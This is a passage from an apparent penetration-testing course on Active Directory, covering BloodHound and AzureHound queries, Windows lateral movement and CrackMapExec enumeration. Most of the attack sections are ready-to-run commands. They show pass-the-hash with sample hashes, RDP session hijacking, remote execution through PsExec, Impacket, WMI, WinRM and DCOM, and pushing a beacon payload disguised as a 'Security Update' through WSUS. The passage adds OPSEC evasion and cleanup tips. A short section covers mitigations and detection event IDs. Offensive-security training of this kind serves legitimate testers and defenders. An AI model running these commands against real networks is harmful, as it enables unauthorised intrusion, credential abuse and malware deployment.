  • Group membership sprawl: find nested group memberships that grant unintended privileges
# Defensive Cypher: find all attack paths to Tier-Zero
MATCH p=shortestPath((n)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) WHERE NOT n=g RETURN p

# Find users with admin rights they likely should not have
MATCH (u:User)-[:AdminTo]->(c:Computer) WHERE NOT u.name CONTAINS "ADMIN" RETURN u.name, c.name

# Stale accounts with privileged access
MATCH (u:User {enabled:true})-[:MemberOf*1..]->(g:Group {highvalue:true}) WHERE u.lastlogontimestamp < (datetime().epochseconds - (180 * 86400)) RETURN u.name, g.name

Methodology

  • Find Kerberoastable users with a path to Domain Admins: 
    MATCH (u:User {hasspn:true, enabled:true}) MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN u.name, length(p)
  • Identify users that can DCSync: 
    MATCH (u)-[:GetChanges]->(d:Domain) MATCH (u)-[:GetChangesAll]->(d) RETURN u.name
  • Find computers with unconstrained delegation (excluding DCs): 
    MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name
  • Find computers where Domain Users have local admin: 
    MATCH (g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name
  • Query all ACL-based attack paths to Domain Admins: 
    MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p
  • Enable Debug mode in Settings to view raw Cypher behind pre-built queries, then adapt them for custom targets
  • Save frequently used queries to customqueries.json for reuse across engagements

3.5 Azure Enumeration

AzureHound extends BloodHound's data collection to Azure Active Directory (now Microsoft Entra ID). It enumerates Azure AD users, groups, roles, applications, service principals, and their relationships.

3.5.1 Azure Enumeration with AzureHound

AzureHound extends BloodHound's data collection to Azure Active Directory (now Microsoft Entra ID). It enumerates Azure AD users, groups, roles, applications, service principals, and their relationships.

# Install AzureHound
# Download from https://github.com/BloodHoundAD/AzureHound/releases

# Run AzureHound with device code authentication
./azurehound -t <tenant-id> --auth devicecode

# Run with client credentials
./azurehound -t <tenant-id> --clientid <app-id> --clientsecret <secret>

# Collect all Azure data
./azurehound -t <tenant-id> --auth devicecode list --output azurehound.json

AzureHound collects Azure-specific node types: Tenant, Subscription, Resource Group, Virtual Machine, Key Vault, App Registration, Service Principal, and Managed Identity.

3.5.2 Azure Attacks via BloodHound

BloodHound CE supports Azure attack path analysis alongside on-premises AD. Common Azure AD attack paths:

  • Global Administrator: equivalent to Domain Admin in Azure. Any path to GA is a domain compromise path
  • Application Admin / Cloud App Admin: can add credentials to existing app registrations with high privileges
  • Privileged Role Administrator: can assign any Azure AD role, including Global Administrator
  • Service Principal abuse: service principals with high Azure RBAC roles can be targeted via exposed credentials in code repositories or Key Vault misconfigurations
  • Hybrid paths: Azure AD Connect syncs on-premises AD to Azure AD. Compromising the sync account can lead to cloud compromise, and vice versa
# Cypher: find all paths to Global Administrator role
MATCH p=shortestPath((n)-[*1..]->(r:AZRole {displayname:"Global Administrator"})) RETURN p

# Find service principals with Owner rights on subscriptions
MATCH (sp:AZServicePrincipal)-[:AZOwns]->(s:AZSubscription) RETURN sp.displayname, s.displayname

Methodology

  • Run AzureHound with device code authentication to collect Azure AD data: 
    ./azurehound -t  --auth devicecode list --output azurehound.json
  • Alternatively, authenticate with client credentials (app registration): 
    ./azurehound -t  --clientid  --clientsecret
  • Import AzureHound output into BloodHound CE and review hybrid (on-prem + Azure) attack paths
  • Query for all paths to the Global Administrator role: 
    MATCH p=shortestPath((n)-[*1..]->(r:AZRole {displayname:"Global Administrator"})) RETURN p
  • Find service principals with Owner rights on subscriptions: 
    MATCH (sp:AZServicePrincipal)-[:AZOwns]->(s:AZSubscription) RETURN sp.displayname, s.displayname
  • Investigate hybrid paths through Azure AD Connect sync accounts that bridge on-prem AD and Azure AD

4. Windows Lateral Movement

Lateral movement describes techniques for moving between systems within a network after initial compromise. In Active Directory environments, lateral movement typically leverages legitimate administrative protocols and authentication mechanisms to access additional hosts and escalate domain privilege.

4.1 Lateral Movement Overview

Lateral movement relies on two prerequisites: valid credentials (or credential material) and a remote service that accepts authentication. The attacker uses one to authenticate to the other and gain code execution or data access on a remote host.

Core concepts:

  • Administrative shares: C$, ADMIN$, and IPC$ are hidden shares accessible to local administrators. Most lateral movement tools use these shares to stage payloads or execute commands
  • Authentication material: plaintext passwords, NTLM hashes (pass-the-hash), Kerberos tickets (pass-the-ticket), or certificates (pass-the-certificate)
  • Logon types: different lateral movement techniques produce different Windows logon events (Type 3 Network, Type 10 RemoteInteractive, Type 7 Unlock). This affects which credential material is cached on the target
  • Local admin requirement: most lateral movement techniques require the authenticating principal to be a local administrator on the target. Exceptions include RDP (Remote Desktop Users group) and WinRM (Remote Management Users)

4.2 RDP and Remote Administration

RDP provides an interactive graphical session on the target host. It uses TCP port 3389 by default and creates a Type 10 (RemoteInteractive) logon, which caches credentials on the target.

4.2.1 Remote Desktop Protocol (RDP)

RDP provides an interactive graphical session on the target host. It uses TCP port 3389 by default and creates a Type 10 (RemoteInteractive) logon, which caches credentials on the target.

RDP Overview

RDP access requires membership in the local Administrators or Remote Desktop Users group. Network Level Authentication (NLA), enabled by default on modern Windows, requires valid credentials before the session is established.

AspectDetail
Default PortTCP 3389
Logon Type10 (RemoteInteractive)
Credential CachingYes (credentials cached in LSASS)
Required GroupAdministrators or Remote Desktop Users
NLAPre-authentication required by default
xfreerdp from Linux
# Basic RDP connection
xfreerdp /v:10.10.10.50 /u:jdoe /p:'P@ss123' /d:CORP

# Pass-the-hash with RDP (requires Restricted Admin or disabled NLA)
xfreerdp /v:10.10.10.50 /u:admin /pth:7facdc498ed1680c4fd1448319a8c04f /d:CORP

# Dynamic resolution and drive mapping
xfreerdp /v:10.10.10.50 /u:jdoe /p:'P@ss123' /d:CORP /dynamic-resolution /drive:share,/tmp
Restricted Admin Mode

Restricted Admin Mode allows RDP authentication using only the NTLM hash (no plaintext password needed). The session runs with network logon semantics: credentials are not cached on the target, but the session cannot access network resources as the authenticating user.

# Enable Restricted Admin Mode (on target, requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Connect via Restricted Admin from Windows
mstsc /restrictedadmin /v:10.10.10.50

# Connect via xfreerdp with PtH
xfreerdp /v:10.10.10.50 /u:admin /pth:<NTLM_HASH> /d:CORP /restricted-admin
SharpRDP

SharpRDP is a .NET tool that executes commands over RDP without an interactive GUI session. It connects to the target, sends keystrokes to a cmd.exe or powershell.exe window, and disconnects.

# Execute a command via SharpRDP
.\SharpRDP.exe computername=SRV01 command="whoami > C:\Temp\out.txt" username=CORP\admin password=P@ss123
RDP Hijacking

An administrator with SYSTEM access on a host can hijack existing RDP sessions without knowing the session user's password. This uses the tscon command to connect to another user's disconnected or active session.

# List active sessions
query user

# Hijack session (requires SYSTEM)
# Use PsExec to get SYSTEM, then connect to session ID 2
PsExec.exe -s -i cmd.exe
tscon 2 /dest:console
OPSEC: RDP hijacking does not generate a logon event for the hijacker. The original session owner is disconnected silently.
BloodHound RDP Analysis
# Cypher: find all users who can RDP to a target
MATCH (u)-[:CanRDP]->(c:Computer {name:"SRV01.CORP.LOCAL"}) RETURN u.name

# Find computers where Domain Users can RDP
MATCH (g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[:CanRDP]->(c:Computer) RETURN c.name

4.2.2 Secure Shell (SSH)

Modern Windows versions (Server 2019+, Windows 10 1809+) include an optional OpenSSH server. When enabled, SSH provides a command shell on port 22 with no Windows-specific detection signatures.

# Check if OpenSSH is installed on the target
crackmapexec ssh 10.10.10.50 -u admin -p 'P@ss123'

# Connect via SSH
ssh admin@10.10.10.50

# SSH port forwarding (local forward)
ssh -L 8080:internal-host:80 admin@10.10.10.50

# SOCKS proxy via SSH
ssh -D 1080 admin@10.10.10.50

SSH logons on Windows generate event ID 4624 with Logon Type 8 (NetworkCleartext) unless public key authentication is used.

4.2.3 Remote Management Tools (VNC, AnyDesk, TeamViewer)

Third-party remote management tools installed for legitimate purposes can be abused for lateral movement. Look for these during enumeration:

  • VNC: often uses port 5900. Credentials may be stored in registry or configuration files and can be extracted
  • AnyDesk: uses its own protocol. Unattended access passwords are stored locally and can be extracted from %ProgramData%\AnyDesk\system.conf
  • TeamViewer: stores credentials in the Windows registry. Tools like TeamViewer_Passwordeer can extract them
# Find remote management tools
Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match "VNC|AnyDesk|TeamViewer" }

# Check for listening VNC
netstat -an | findstr ":5900"

# Check for AnyDesk
Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\AnyDesk"

Methodology

  • Enumerate hosts with RDP enabled using BloodHound Cypher query: 
    MATCH (u)-[:CanRDP]->(c:Computer) RETURN u.name, c.name
  • Connect via xfreerdp with credentials: 
    xfreerdp /v:10.10.10.50 /u:jdoe /p:'P@ss123' /d:CORP /dynamic-resolution /drive:share,/tmp
  • If only an NTLM hash is available, enable Restricted Admin and use PtH: 
    # On target (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
    # From Linux
xfreerdp /v:10.10.10.50 /u:admin /pth:<NTLM_HASH> /d:CORP /restricted-admin
  • Execute commands over RDP without a GUI session using SharpRDP: 
    .\SharpRDP.exe computername=SRV01 command="whoami > C:\Temp\out.txt" username=CORP\admin password=P@ss123
  • If SYSTEM access is available, hijack existing RDP sessions: 
    query user
PsExec.exe -s -i cmd.exe
tscon 2 /dest:console
  • Check for SSH on modern Windows hosts and connect if available: 
    crackmapexec ssh 10.10.10.50 -u admin -p 'P@ss123'
ssh admin@10.10.10.50
  • Enumerate third-party remote management tools (VNC, AnyDesk, TeamViewer): 
    Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match "VNC|AnyDesk|TeamViewer" }
netstat -an | findstr ":5900"

4.3 SMB and WMI Execution

SMB-based lateral movement techniques authenticate to the target's SMB service (port 445) and use administrative shares to upload payloads or execute commands. These produce Type 3 (Network) logon events and do not cache credentials on the target.

4.3.1 Server Message Block (SMB)

SMB-based lateral movement techniques authenticate to the target's SMB service (port 445) and use administrative shares to upload payloads or execute commands. These produce Type 3 (Network) logon events and do not cache credentials on the target.

SMB Overview
AspectDetail
Default PortTCP 445
Logon Type3 (Network)
Credential CachingNo
Required GroupLocal Administrators
PtH SupportYes
PsExec

PsExec (Sysinternals) copies a service binary to the ADMIN$ share, creates and starts a Windows service to execute it, then cleans up. It provides an interactive command shell.

# Sysinternals PsExec
.\PsExec.exe \\SRV01 -u CORP\admin -p P@ss123 cmd.exe

# Run as SYSTEM
.\PsExec.exe \\SRV01 -s cmd.exe

# Execute a specific command
.\PsExec.exe \\SRV01 -u CORP\admin -p P@ss123 ipconfig /all
Impacket PsExec, smbexec, wmiexec, and atexec

Impacket provides multiple remote execution tools, each with different execution mechanics and forensic footprints.

# impacket-psexec (uploads service binary, high forensic footprint)
impacket-psexec CORP/admin:'P@ss123'@10.10.10.50

# impacket-smbexec (creates a service per command, slightly quieter)
impacket-smbexec CORP/admin:'P@ss123'@10.10.10.50

# impacket-wmiexec (uses WMI, no service creation)
impacket-wmiexec CORP/admin:'P@ss123'@10.10.10.50

# impacket-atexec (uses Task Scheduler)
impacket-atexec CORP/admin:'P@ss123'@10.10.10.50 "whoami"

# Pass-the-hash with any Impacket tool
impacket-psexec CORP/admin@10.10.10.50 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Pass the Hash over SMB

NTLM hashes can be used directly for SMB authentication without cracking. This applies to all SMB-based tools.

# CrackMapExec with NTLM hash
crackmapexec smb 10.10.10.50 -u admin -H 7facdc498ed1680c4fd1448319a8c04f -d CORP -x "whoami"

# evil-winrm with hash (WinRM, not SMB, but commonly paired)
evil-winrm -i 10.10.10.50 -u admin -H 7facdc498ed1680c4fd1448319a8c04f

4.3.2 Windows Management Instrumentation (WMI)

WMI is a Windows administration framework that allows remote process creation and command execution. WMI-based lateral movement uses DCOM over port 135 (with a dynamic high port) and does not write files to disk on the target.

WMI Overview
AspectDetail
Default PortTCP 135 + dynamic high port
Logon Type3 (Network)
Credential CachingNo
Required GroupLocal Administrators
Disk ArtifactsMinimal (no service binary)
wmiexec.py
# Interactive shell via WMI
impacket-wmiexec CORP/admin:'P@ss123'@10.10.10.50

# Pass-the-hash
impacket-wmiexec CORP/admin@10.10.10.50 -hashes :7facdc498ed1680c4fd1448319a8c04f

# Execute single command
impacket-wmiexec CORP/admin:'P@ss123'@10.10.10.50 "hostname"
Invoke-WMIExec
# PowerShell WMI remote process creation
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt" -ComputerName SRV01 -Credential (Get-Credential)

# Using Invoke-WMIExec (Kevin Robertson)
Invoke-WMIExec -Target 10.10.10.50 -Username admin -Domain CORP -Hash 7facdc498ed1680c4fd1448319a8c04f -Command "whoami"
WMI Process Creation

WMI's Win32_Process.Create method spawns a process on the remote host. The process runs under the authenticated user's context. Output is not returned directly; redirect output to a file and retrieve it via SMB.

# Remote process via WMI (native)
wmic /node:SRV01 /user:CORP\admin /password:P@ss123 process call create "cmd.exe /c ipconfig > C:\Temp\output.txt"

# Retrieve output
type \\SRV01\C$\Temp\output.txt

Methodology

  • Execute commands via PsExec (creates a service on the target): 
    .\PsExec.exe \\SRV01 -u CORP\admin -p P@ss123 cmd.exe
  • Use Impacket tools from Linux, choosing by forensic footprint: 
    # psexec (uploads service binary, high footprint)
impacket-psexec CORP/admin:'P@ss123'@10.10.10.50

# smbexec (creates a service per command, slightly quieter)
impacket-smbexec CORP/admin:'P@ss123'@10.10.10.50

# wmiexec (uses WMI, no service creation)
impacket-wmiexec CORP/admin:'P@ss123'@10.10.10.50

# atexec (uses Task Scheduler)
impacket-atexec CORP/admin:'P@ss123'@10.10.10.50 "whoami"
  • Authenticate via pass-the-hash with any Impacket tool: 
    impacket-psexec CORP/admin@10.10.10.50 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
  • Use CrackMapExec for PtH command execution over SMB: 
    crackmapexec smb 10.10.10.50 -u admin -H 7facdc498ed1680c4fd1448319a8c04f -d CORP -x "whoami"
  • Execute remotely via WMI (no disk artifacts, uses port 135): 
    impacket-wmiexec CORP/admin:'P@ss123'@10.10.10.50 "hostname"
  • Use native PowerShell WMI for remote process creation: 
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt" -ComputerName SRV01 -Credential (Get-Credential)
  • Use Invoke-WMIExec for hash-based WMI execution: 
    Invoke-WMIExec -Target 10.10.10.50 -Username admin -Domain CORP -Hash 7facdc498ed1680c4fd1448319a8c04f -Command "whoami"

4.4 WinRM and DCOM Execution

WinRM is Microsoft's implementation of WS-Management, providing remote shell access over HTTP/HTTPS. It is the protocol underlying PowerShell Remoting.

4.4.1 Windows Remote Management (WinRM)

WinRM is Microsoft's implementation of WS-Management, providing remote shell access over HTTP/HTTPS. It is the protocol underlying PowerShell Remoting.

WinRM Overview
AspectDetail
Default PortsTCP 5985 (HTTP), 5986 (HTTPS)
Logon Type3 (Network)
Credential CachingNo (unless CredSSP is used)
Required GroupLocal Administrators or Remote Management Users
PtH SupportYes (with evil-winrm or Invoke-Command + NTLM)
evil-winrm
# Basic connection
evil-winrm -i 10.10.10.50 -u admin -p 'P@ss123'

# Pass-the-hash
evil-winrm -i 10.10.10.50 -u admin -H 7facdc498ed1680c4fd1448319a8c04f

# Upload/download files
upload /local/path/payload.exe C:\Temp\payload.exe
download C:\Temp\loot.zip /local/path/loot.zip

# Load PowerShell scripts into the session
evil-winrm -i 10.10.10.50 -u admin -p 'P@ss123' -s /opt/scripts/
PowerShell Remoting
# Enable WinRM on the local machine (if needed)
Enable-PSRemoting -Force

# Test WinRM connectivity
Test-WSMan -ComputerName SRV01

# Create a credential object
$cred = New-Object System.Management.Automation.PSCredential("CORP\admin", (ConvertTo-SecureString "P@ss123" -AsPlainText -Force))
Enter-PSSession and Invoke-Command
# Interactive remote session
Enter-PSSession -ComputerName SRV01 -Credential $cred

# Execute a command on a remote host
Invoke-Command -ComputerName SRV01 -Credential $cred -ScriptBlock { whoami; hostname }

# Execute on multiple hosts simultaneously
Invoke-Command -ComputerName SRV01,SRV02,DC01 -Credential $cred -ScriptBlock { hostname }

# Run a local script on a remote host
Invoke-Command -ComputerName SRV01 -Credential $cred -FilePath C:\Scripts\enum.ps1

4.4.2 Distributed Component Object Model (DCOM)

DCOM extends COM across the network, allowing remote instantiation of COM objects for code execution. DCOM lateral movement uses port 135 for the initial RPC endpoint mapper connection, then a dynamic high port for the object interaction.

DCOM Overview
AspectDetail
Default PortTCP 135 + dynamic high port
Logon Type3 (Network)
Credential CachingNo
Required GroupLocal Administrators
DetectionLower than PsExec; no service creation
MMC20.Application

The MMC20.Application COM object exposes an ExecuteShellCommand method that spawns a process on the remote host.

# Create remote MMC COM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.50"))

# Execute a command
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Temp\dcom.txt", "7")
ShellWindows

The ShellWindows COM object (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39) provides access to the Windows shell on the remote system.

# Instantiate ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "10.10.10.50"))

# Execute via the shell
$com.item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
ShellBrowserWindow

The ShellBrowserWindow COM object (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880) works similarly to ShellWindows but uses a single instance rather than a collection.

# Instantiate ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.50"))

# Execute command
$com.Document.Application.ShellExecute("cmd.exe", "/c net user /domain", "C:\Windows\System32", $null, 0)
OPSEC: DCOM lateral movement does not create services or write binaries to ADMIN$. The spawned process is a child of the DCOM server process (svchost.exe), which is less suspicious than a PsExec service binary.

Methodology

  • Connect to target via evil-winrm with credentials or hash: 
    # Password auth
evil-winrm -i 10.10.10.50 -u admin -p 'P@ss123'

# Pass-the-hash
evil-winrm -i 10.10.10.50 -u admin -H 7facdc498ed1680c4fd1448319a8c04f
  • Test WinRM connectivity and create a credential object: 
    Test-WSMan -ComputerName SRV01
$cred = New-Object System.Management.Automation.PSCredential("CORP\admin", (ConvertTo-SecureString "P@ss123" -AsPlainText -Force))
  • Execute commands on remote hosts via PowerShell Remoting: 
    # Single host
Invoke-Command -ComputerName SRV01 -Credential $cred -ScriptBlock { whoami; hostname }

# Multiple hosts simultaneously
Invoke-Command -ComputerName SRV01,SRV02,DC01 -Credential $cred -ScriptBlock { hostname }
  • Open an interactive remote session: 
    Enter-PSSession -ComputerName SRV01 -Credential $cred
  • Use DCOM lateral movement via MMC20.Application: 
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.50"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami > C:\Temp\dcom.txt", "7")
  • Use DCOM via ShellWindows as an alternative COM object: 
    $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "10.10.10.50"))
$com.item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)
  • Use DCOM via ShellBrowserWindow for single-instance execution: 
    $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.50"))
$com.Document.Application.ShellExecute("cmd.exe", "/c net user /domain", "C:\Windows\System32", $null, 0)

4.5 Software Deployment and Detection

Enterprise software deployment tools (SCCM, PDQ Deploy, ManageEngine) and GPO-based software installation provide legitimate mechanisms for remote code execution. If an attacker gains access to these platforms, they can deploy payloads to any managed system.

4.5.1 Software Deployment and Remote Management

Enterprise software deployment tools (SCCM, PDQ Deploy, ManageEngine) and GPO-based software installation provide legitimate mechanisms for remote code execution. If an attacker gains access to these platforms, they can deploy payloads to any managed system.

  • SCCM: see Module 15 for detailed SCCM exploitation
  • PDQ Deploy: compromising the PDQ server allows pushing packages to all managed endpoints. Credentials for the deployment service account are often stored locally
  • GPO Software Installation: users with GPO edit rights can add MSI packages that install on all computers in the linked OU at next Group Policy refresh
# Enumerate GPOs that deploy software
Get-GPO -All | ForEach-Object {
    $gpoId = $_.Id
    $gpoName = $_.DisplayName
    $path = "\\$($_.DomainName)\SYSVOL\$($_.DomainName)\Policies\{$gpoId}\Machine\Scripts"
    if (Test-Path $path) { Write-Output "$gpoName : $path" }
}

4.5.2 Windows Server Update Services (WSUS)

WSUS manages Windows Update distribution in enterprise environments. If WSUS uses HTTP (not HTTPS), a man-in-the-middle attack can inject malicious updates.

WSUS Overview

WSUS clients pull updates from the WSUS server over HTTP (port 8530) or HTTPS (port 8531). If the connection uses HTTP, ARP spoofing or WPAD manipulation can position the attacker between the client and the WSUS server.

# Check WSUS configuration on a client
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

# Check if WSUS uses HTTP (vulnerable) or HTTPS
# HTTP = exploitable; HTTPS = not exploitable via this method
SharpWSUS

SharpWSUS is a .NET tool that creates malicious WSUS updates on a compromised WSUS server. It injects a fake update that executes an arbitrary command on client machines when they check for updates.

# Locate the WSUS server
.\SharpWSUS.exe locate

# Enumerate WSUS clients
.\SharpWSUS.exe enumerate

# Create a malicious update targeting a specific client
.\SharpWSUS.exe create /payload:"C:\Temp\beacon.exe" /args:"/q" /title:"Security Update" /target:"WS01.corp.local"

# Approve and deploy the update
.\SharpWSUS.exe approve /updateid:<guid> /target:"WS01.corp.local"

# Cleanup after execution
.\SharpWSUS.exe delete /updateid:<guid>
WSUSPect

WSUSPect performs a man-in-the-middle attack against WSUS clients connecting over HTTP. It intercepts the update check and injects a malicious update containing an arbitrary binary.

# WSUSPect proxy (requires MITM position)
python wsuspect_proxy.py -c "C:\Windows\System32\cmd.exe" -a "/c powershell -enc <base64>"
Mitigation: configure WSUS to use HTTPS (port 8531) and enforce TLS pinning. Remove HTTP-based WSUS configurations from GPO.

4.5.3 General Considerations

Key operational considerations for lateral movement:

  • Credential material types: plaintext passwords work with all methods. NTLM hashes work with PtH-compatible tools (SMB, WMI, WinRM via evil-winrm). Kerberos tickets work with pass-the-ticket. Choose the method that matches your available credential material
  • Logon type impact: Type 3 (Network) logons do NOT cache credentials on the target. Type 10 (RemoteInteractive/RDP) logons DO cache credentials. Prefer Type 3 when possible to avoid leaving credential material behind
  • Token impersonation: after lateral movement, the security context may not match what you expect. Use whoami and klist to verify the current identity and available tickets
  • Cleanup: remove artifacts (uploaded binaries, created services, scheduled tasks) after completing objectives on each host. Tools like PsExec create and delete a service automatically, but the event logs persist
  • Port requirements: verify that the required ports (445, 135, 5985, 3389) are accessible from your current position. Use Test-NetConnection or nmap to check before attempting lateral movement

4.5.4 Lateral Movement Prevention and Detection

Defending against lateral movement requires a layered approach combining network segmentation, privilege management, and monitoring.

  • Network segmentation: restrict SMB (445), WinRM (5985/5986), and RDP (3389) traffic between workstations. Only allow these protocols from management hosts to servers
  • Privileged Access Workstations (PAW): administer Tier-0 assets (DCs, ADCS, SCCM) only from hardened PAWs. Do not use privileged credentials on lower-tier workstations
  • Local Administrator Password Solution (LAPS): randomize local admin passwords on every machine to prevent pass-the-hash between hosts
  • Windows Defender Credential Guard: protects LSASS from credential dumping by running it in a virtualized container
  • Protected Users group: members cannot use NTLM, DES, or RC4 Kerberos encryption. Credentials are never cached

Detection rules:

TechniqueEvent IDDetection
PsExec7045Service installation with random name
WMI4648Explicit credential logon via WMI
WinRM4624 + 91Type 3 logon on port 5985
RDP4624 + 1149Type 10 logon with source IP
DCOM4624Type 3 logon via DCOM port 135
Pass-the-Hash4624Type 3 logon with NTLM auth and non-standard source
Service Creation7045, 4697New service installed on remote host
Scheduled Task4698New scheduled task created remotely

Methodology

  • Enumerate GPOs that deploy software or contain startup scripts: 
    Get-GPO -All | ForEach-Object {
    $gpoId = $_.Id
    $gpoName = $_.DisplayName
    $path = "\\$($_.DomainName)\SYSVOL\$($_.DomainName)\Policies\{$gpoId}\Machine\Scripts"
    if (Test-Path $path) { Write-Output "$gpoName : $path" }
}
  • Check WSUS configuration for HTTP (exploitable) vs HTTPS: 
    reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer
  • If WSUS uses HTTP, exploit with SharpWSUS to push a malicious update: 
    .\SharpWSUS.exe locate
.\SharpWSUS.exe enumerate
.\SharpWSUS.exe create /payload:"C:\Temp\beacon.exe" /args:"/q" /title:"Security Update" /target:"WS01.corp.local"
.\SharpWSUS.exe approve /updateid:<guid> /target:"WS01.corp.local"
  • Clean up SharpWSUS artifacts after execution: 
    .\SharpWSUS.exe delete /updateid:<guid>
  • Verify port accessibility before attempting lateral movement: 
    Test-NetConnection -ComputerName SRV01 -Port 445
Test-NetConnection -ComputerName SRV01 -Port 5985
Test-NetConnection -ComputerName SRV01 -Port 3389
  • After completing objectives, verify identity and clean up artifacts: 
    whoami
klist

5. Using CrackMapExec

CrackMapExec (CME) is a post-exploitation tool for pentesting Active Directory environments. It automates credential validation, enumeration, and command execution across large networks. The project was forked and continued as NetExec (nxc), which maintains the same syntax and module ecosystem. Throughout this module, commands use crackmapexec but can be substituted with nxc interchangeably.

5.1 CME Overview and Setup

CME is pre-installed on most offensive Linux distributions. For manual installation or to use NetExec:

# Install CrackMapExec via pipx
pipx install crackmapexec

# Install NetExec (actively maintained fork)
pipx install netexec

# Verify installation
crackmapexec --version
nxc --version

Targets can be specified in several formats:

FormatExampleDescription
Single IP192.168.1.10Target a single host
CIDR range192.168.1.0/24Target an entire subnet
IP range192.168.1.1-50Target a range of hosts
Filetargets.txtOne target per line

Supported protocols:

# List available protocols
crackmapexec --help

# Protocol-specific help
crackmapexec smb --help
crackmapexec ldap --help
ProtocolDefault PortPrimary Use
smb445Share enum, credential validation, command execution
ldap389/636AD enumeration, user and group queries
mssql1433SQL queries, xp_cmdshell execution
ssh22SSH credential validation and command execution
winrm5985/5986PowerShell remoting
rdp3389RDP access validation (NLA check)
ftp21FTP credential validation

5.2 Enumeration and Reconnaissance

Running CME against a target with the SMB protocol and no credentials returns useful information about the host, including hostname, domain, OS version, and whether SMB signing is enforced.

5.2.1 Basic SMB Reconnaissance

Running CME against a target with the SMB protocol and no credentials returns useful information about the host, including hostname, domain, OS version, and whether SMB signing is enforced.

# Basic host enumeration (no credentials)
crackmapexec smb 192.168.1.0/24

# Output shows: host, domain, OS, signing status
# SMB  192.168.1.10  445  DC01  [*] Windows Server 2019 Build 17763 x64 (domain:CORP.LOCAL) (signing:True) (SMBv1:False)

Key indicators from the output:

  • signing:True means SMB signing is enforced and the host is not vulnerable to SMB relay
  • signing:False means the host is a candidate for NTLM relay attacks
  • Domain controllers typically enforce signing; workstations and member servers often do not
# Generate a list of hosts with signing disabled (relay targets)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

5.2.2 Exploiting NULL and Anonymous Sessions

Older or misconfigured systems may permit NULL session access, allowing unauthenticated enumeration of shares, users, and groups.

# Attempt NULL session enumeration
crackmapexec smb 192.168.1.10 -u '' -p ''

# Enumerate shares with NULL session
crackmapexec smb 192.168.1.10 -u '' -p '' --shares

# Enumerate users via NULL session
crackmapexec smb 192.168.1.10 -u '' -p '' --users

# Enumerate groups
crackmapexec smb 192.168.1.10 -u '' -p '' --groups

# Try anonymous access with guest account
crackmapexec smb 192.168.1.10 -u 'guest' -p '' --shares
Note: NULL sessions are disabled by default on modern Windows systems. The RestrictAnonymous and RestrictAnonymousSAM registry values control this behaviour. Domain controllers running Windows Server 2016+ rarely allow NULL sessions.

5.2.3 Spidering SMB Shares

CME can crawl SMB shares to identify interesting files such as configuration files, scripts, and documents containing credentials.

# Spider all accessible shares (spider_plus module)
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' -M spider_plus

# Spider with depth and output to JSON
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' -M spider_plus -o EXCLUDE_DIR=IPC$

# Basic share spidering with pattern matching
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --spider C$ --pattern txt,xml,config,ini,ps1

# List shares first to identify targets
crackmapexec smb 192.168.1.0/24 -u jsmith -p 'Password1' --shares

The spider_plus module outputs results to /tmp/cme_spider_plus/ as JSON files. Each file corresponds to a target host and lists all discovered files with their sizes and paths.

5.2.4 Mapping and Enumeration with SMB

CME provides several built-in flags for enumerating information from hosts via SMB.

# Enumerate shares and access permissions
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --shares

# Enumerate logged-on users
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --loggedon-users

# Enumerate active sessions
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --sessions

# Enumerate disk drives
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --disks

# Enumerate domain users via RID brute forcing
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --rid-brute

# Enumerate domain users
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --users

# Enumerate domain groups
crackmapexec smb 192.168.1.10 -u jsmith -p 'Password1' --groups

# Enumerate domain computers
